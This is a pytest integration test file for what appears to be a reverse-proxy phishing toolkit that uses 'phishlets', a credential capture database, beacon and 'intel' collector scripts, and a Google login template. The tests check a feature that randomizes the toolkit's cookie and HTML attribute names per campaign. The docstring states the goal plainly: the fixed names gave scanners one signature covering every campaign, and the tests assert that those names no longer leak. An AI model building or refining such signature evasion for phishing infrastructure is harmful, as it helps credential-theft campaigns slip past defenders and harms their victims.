"""Per-campaign symbol names: the fixed strings a scanner can grep.

`__bhs`, `__bhi`, `data-capture`, `data-beacon`, `data-intel` were always the same,
so one signature covered every campaign this tool has ever run. The names are now
derivable per campaign (`--symbols random`), while the historical set stays the
default so existing tooling and runbooks keep working.

These tests exercise the real proxy and the real static server with a randomized set:
the cookie that is issued, the cookie that is honoured, the attributes in the injected
tags, and the absence of the old names.
"""
import http.client
import os
import re
import sys
import tempfile
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)

from core import capture as cap  # noqa: E402
from core import server as srv  # noqa: E402
from core.proxy import (  # noqa: E402
    CAPTURE_PATH,
    INTEL_JS_PATH,
    Phishlet,
    ProxyEngine,
    serve_proxy,  # noqa: E402
)
from core.symbols import Symbols  # noqa: E402

pytestmark = pytest.mark.integration


def free_port():
    import socket
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


# ================================================================ unit ========
class TestSymbols:

    def test_the_defaults_are_the_historical_names(self):
        s = Symbols.fixed()
        assert s.session == "__bhs"
        assert s.intel == "__bhi"
        assert (s.capture_attr, s.beacon_attr, s.intel_attr) == \
            ("data-capture", "data-beacon", "data-intel")
        assert s.random is False

    def test_random_is_fresh_and_valid(self):
        a, b = Symbols.random_(), Symbols.random_()
        assert a.session != b.session
        for s in (a, b):
            assert s.session.startswith("__") and s.session.endswith("s")
            assert s.intel.endswith("i")
            assert s.capture_attr.startswith("data-")
            assert s.session not in ("__bhs",) and s.intel not in ("__bhi",)
            assert s.random is True

    def test_a_name_that_could_break_a_header_is_refused(self):
        for bad in ("a b", "", "with;semi", "with\nnewline", "x" * 200):
            with pytest.raises(ValueError):
                Symbols(session=bad)

    def test_the_mode_parser(self):
        assert Symbols.from_mode("random").random is True
        assert Symbols.from_mode("fixed").random is False
        assert Symbols.from_mode("").random is False
        assert Symbols.from_mode(None).random is False

    def test_it_serialises(self):
        d = Symbols.random_().to_dict()
        assert set(d) == {"session", "intel", "capture_attr", "beacon_attr",
                          "intel_attr", "random"}


# ========================================================== the real proxy =====
class TestTheProxyHonoursThem:

    @staticmethod
    def _upstream():
        class H(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                b = b"<html><head><title>t</title></head><body>login</body></html>"
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.send_header("Content-Length", str(len(b)))
                self.end_headers()
                self.wfile.write(b)

        httpd = ThreadingHTTPServer(("127.0.0.1", 0), H)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        return httpd

    def _proxy(self, symbols):
        up = self._upstream()
        db = cap.CaptureDB(os.path.join(tempfile.mkdtemp(), "s.db"))
        ph = Phishlet(name="sym", upstream=f"127.0.0.1:{up.server_address[1]}",
                      scheme="http")
        engine = ProxyEngine(ph, db=db, geo_provider="off", logger=lambda *a: None)
        engine.symbols = symbols
        port = free_port()
        httpd = serve_proxy(engine, port, campaign="sym")
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.25)
        return up, db, httpd, port, up.server_address[1]

    @staticmethod
    def _get(port, path, host, cookie=""):
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
        h = {"Host": host}
        if cookie:
            h["Cookie"] = cookie
        conn.request("GET", path, headers=h)
        r = conn.getresponse()
        body = r.read().decode("utf-8", "replace")
        headers = dict(r.getheaders())
        status = r.status
        conn.close()
        return status, body, headers

    def test_the_issued_cookie_and_the_page_use_the_random_names(self):
        sym = Symbols.random_()
        up, db, httpd, port, uport = self._proxy(sym)
        try:
            st, body, headers = self._get(port, "/", f"127.0.0.1:{uport}")
            assert st == 200
            set_cookie = headers.get("Set-Cookie", "")
            m = re.search(rf"{re.escape(sym.session)}=([0-9a-f]{{16,64}})", set_cookie)
            assert m, set_cookie
            assert "__bhs" not in set_cookie, "the historical name leaked"
            # the injected tags carry the derived attribute names, not the old ones
            assert f'{sym.capture_attr}="{CAPTURE_PATH}"' in body, body[:300]
            assert f'{sym.beacon_attr}' in body
            assert f'{sym.intel_attr}="{INTEL_JS_PATH.rsplit("/", 1)[0]}"' not in body
            for old in ("data-capture", "data-beacon", "data-intel", "__bhs"):
                assert old not in body, f"{old} is still in the page"
        finally:
            httpd.shutdown()
            httpd.server_close()
            db.close()
            up.shutdown()

    def test_the_session_is_reused_from_the_random_cookie(self):
        """If the name changed and the reader did not follow, every request would mint
        a NEW session: the cookie would be re-issued with a different id every time."""
        sym = Symbols.random_()
        up, db, httpd, port, uport = self._proxy(sym)
        try:
            _st, _b, headers = self._get(port, "/", f"127.0.0.1:{uport}")
            m = re.search(rf"{re.escape(sym.session)}=([0-9a-f]{{16,64}})",
                          headers.get("Set-Cookie", ""))
            assert m, headers.get("Set-Cookie")
            sid = m.group(1)
            st, _b, headers2 = self._get(port, "/", f"127.0.0.1:{uport}",
                                         cookie=f"{sym.session}={sid}")
            assert st == 200
            again = re.search(rf"{re.escape(sym.session)}=([0-9a-f]{{16,64}})",
                              headers2.get("Set-Cookie", ""))
            assert again and again.group(1) == sid, (
                "the random cookie did not resolve to the existing session")
        finally:
            httpd.shutdown()
            httpd.server_close()
            db.close()
            up.shutdown()


# ========================================================== the real server ====
class TestTheStaticServerHonoursThem:
    """End to end on the static server: the intel cookie it issues must carry the
    campaign's name, not the historical `__bhi`."""

    def _serve(self, symbols):
        db_path = os.path.join(tempfile.mkdtemp(prefix="bp_sym_"), "t.db")
        site_dir = os.path.join(HERE, "templates", "03_google")
        assert os.path.isdir(site_dir), "the fixture template is missing"
        port = free_port()
        httpd, _H = srv.serve(os.path.join(HERE, "templates"), site_dir, port,
                              db_path, geo_provider="off", site_name="google",
                              symbols=symbols)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.25)
        return httpd, port, db_path

    def test_the_intel_cookie_uses_the_campaign_name(self):
        sym = Symbols.random_()
        httpd, port, db_path = self._serve(sym)
        try:
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
            conn.request("GET", "/__bh/intel.js")      # this route issues the cookie
            r = conn.getresponse()
            r.read()
            headers = dict(r.getheaders())
            conn.close()
            issued = headers.get("Set-Cookie", "")
            assert issued, "the collector route issued no cookie"
            assert f"{sym.intel}=" in issued, issued
            assert "__bhi" not in issued, "the historical name leaked"
        finally:
            httpd.shutdown()
            httpd.server_close()

    def test_the_page_tag_uses_the_campaign_attribute_name(self):
        sym = Symbols.random_()
        httpd, port, _db = self._serve(sym)
        try:
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
            conn.request("GET", "/")
            r = conn.getresponse()
            body = r.read().decode("utf-8", "replace")
            conn.close()
            assert f'{sym.intel_attr}="/__bh/intel"' in body, body[:400]
            assert "data-intel=" not in body, "the historical attribute leaked"
        finally:
            httpd.shutdown()
            httpd.server_close()

    def test_the_default_is_the_historical_set(self):
        httpd, port, _db = self._serve(None)
        try:
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
            conn.request("GET", "/__bh/intel.js")
            r = conn.getresponse()
            r.read()
            issued = dict(r.getheaders()).get("Set-Cookie", "")
            conn.close()
            assert "__bhi=" in issued, issued
        finally:
            httpd.shutdown()
            httpd.server_close()
